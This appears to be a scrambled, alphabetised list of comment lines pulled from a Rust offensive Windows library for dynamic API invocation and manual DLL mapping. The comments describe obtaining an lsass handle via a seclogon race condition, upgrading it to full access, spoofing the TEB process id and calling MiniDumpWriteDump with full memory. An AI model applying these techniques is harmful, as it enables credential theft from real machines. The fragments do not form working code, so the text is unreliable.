"//
"//         Err(e) => println!(""{}"",e),"
"//         Ok(addr) => println!(""The address where RtlDispatchAPC is located at is 0x{:X}."", addr),"
"//         println!(""Handle to process with id {} closed."", pid);"
"//     Err(e) => println!(""{}"",e),"
"//     None => println!(""Error calling LdrGetProcedureAddress""),"
"//     Ok(addr) => if addr != 0 {println!(""ntdll.dll base address is 0x{:X}."", addr)},"
"//     Some(x) => if x == 0 {println!(""RtlDispatchAPC is located at the address: 0x{:X}"",*return_address as u64);},"
"//     Some(x) => if x.0 == 0 {println!(""ntdll base address is 0x{:X}"",x.0);},"
"//     let addr = dinvoke::get_function_address(ntdll, ""NtCreateThread"");    "
"//     let addr = dinvoke::get_function_address_ordinal(ntdll, 8);    "
"//     let ret = dinvoke::ldr_get_procedure_address(ntdll,"""", 8);"
"//     println!(""Handle to process with id {} with PROCESS_DUP_HANDLE access right successfully obtained."", pid);"
"//     println!(""The address where NtCreateThread is located at is 0x{:X}."", addr);"
"//     println!(""The base address of ntdll.dll is 0x{:X}."", ntdll);"
"//     println!(""The function with ordinal 8 is located at 0x{:X}."", addr);"
"//    let pe = manualmap::read_and_map_module(""c:\\some\\random\\file.dll"").unwrap();"
"//    let ret = dinvoke::call_module_entry_point(&pe.0, pe.1);"
"// //dinvoke::dynamic_invoke(i64,&str,<function_type>,Option<return_type>,[arguments])"
"// In any other case, it will return the same data type that the called function would return"
"// Therefore, we first duplicate the handle with the same access"
"// dinvoke::dynamic_invoke!(ptr,""LdrGetProcedureAddress"",function_ptr,ret,hmodule,fun_name,ordinal,return_address);"
"// dinvoke::dynamic_invoke(&a.0, a.1, ret); // dinvoke::dynamic_invoke(&PeMetadata, i64, bool)"
"// dinvoke::dynamic_invoke(a.1, ""LoadLibraryA"", function_ptr, ret, module_name);"
"// if ret { println!(""Entry point successfully called."");}"
"// let a = manualmap::read_and_map_module(""c:\\some\\random\\file.dll"").unwrap();"
"// let handle = dinvoke::open_process(0x0040, 0, pid).unwrap(); //PROCESS_DUP_HANDLE access right."
"// let kernel32 = manualmap::read_and_map_module(""c:\\windows\\system32\\kernel32.dll"").unwrap();"
"// let name = CString::new(""ntdll.dll"").expect(""CString::new failed"");"
"// let ntdll = dinvoke::get_module_base_address(""ntdll.dll"");"
"// let ptr = dinvoke::get_module_base_address(""ntdll.dll"");"
"// let ret = dinvoke::load_library_a(""ntdll.dll"");"
"// lsass handle obtained from seclogon's race condition cant be upgraded directly, two steps are required"
"// required to keep fields order, otherwise Rust may change that order randomly"
//     
//     if r
//     let ordinal: u32 = 8; 
//     let ordinal: u32 = 8; // Ordinal 8 represents the function RtlDispatchAPC
//     let r = dinvoke::close_handle(handle).unwrap();
//     match ret {
//     {
//     }
// # Example - Dynamically calling LoadLibraryA
// # Example - Dynamically calling with referenced arguments
// 0x00000001|0x00000002|0x00000004 = FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE
// 0x00000002 = LOGON_NETCREDENTIALS_ONLY 
// 0x40000000 = FILE_FLAG_OVERLAPPED
// 0x80 = FILE_READ_ATTRIBUTES
// 3 = OPEN_EXISTING
// 47 = FileProcessIdsUsingFileInformation
// 997 = ERROR_IO_PENDING
// Access denied error pops if this pointer is not liberated.
// Calls the module's entry point with the option DLL_ATTACH_PROCESS.
// Closes a HANDLE object.
// DUPLICATE_SAME_ACCESS
// Duplicate handle in order to manipulate it
// Dynamically calls CreateFileMappingW.
// Dynamically calls CreateFileTransactedA.
// Dynamically calls CreateTransaction.
// Dynamically calls GetFileSize.
// Dynamically calls MapViewOfFile.
// Dynamically calls MiniDumpWriteDump.
// Dynamically calls NtAllocateVirtualMemory.
// Dynamically calls NtDuplicateObject.
// Dynamically calls NtOpenProcess.
// Dynamically calls NtProtectVirtualMemory.
// Dynamically calls NtQueryInformationFile.
// Dynamically calls NtQueryInformationProcess.
// Dynamically calls NtQueryInformationThread.
// Dynamically calls NtQueryObject.
// Dynamically calls NtQuerySystemInformation.
// Dynamically calls NtWriteVirtualMemory.
// Dynamically calls QueryFullProcessImageNameW.
// Dynamically calls RollbackTransaction.
// Dynamically calls RtlAdjustPrivilege.
// Dynamically calls SetHandleInformation.
// Dynamically calls UnmapViewOfFile.
// Dynamically calls an exported function from the specified module.
// Each char is followed by \0. Lovely LPWSTR...
// FILE_MAP_READ
// Get current thread's basic information
// I dont really think it does exist a process image name longer than 500 characters
// Loads and retrieves a module's base address by dynamically calling LoadLibraryA.
// MiniDumpWithFullMemory
// OPLOCK_LEVEL_CACHE_READ | OPLOCK_LEVEL_CACHE_HANDLE
// Opens a HANDLE to a process.
// PROCESS_DUP_HANDLE as access right
// PROCESS_QUERY_INFORMATION & PROCESS_VM_READ 
// Query the system looking for handles information
// REQUEST_OPLOCK_CURRENT_VERSION
// REQUEST_OPLOCK_INPUT_FLAG_REQUEST
// Retrieves the address of an exported function from the specified module by its ordinal.
// Retrieves the address of an exported function from the specified module either by its name 
// Retrieves the address of an exported function from the specified module.
// Retrieves the base address of a module loaded in the current process.
// TEB pid spoofing
// The key thing you are missing
// This is required due to Rust optimizations in order to keep the handle active.
// We have a process handle
// We have a valid process handled
// We need to upgrade our lsass handle to full accesss in order to be able to dump the memory content
// We obtain information about the handle. Two calls to NtQueryObject are required in order to make it work.
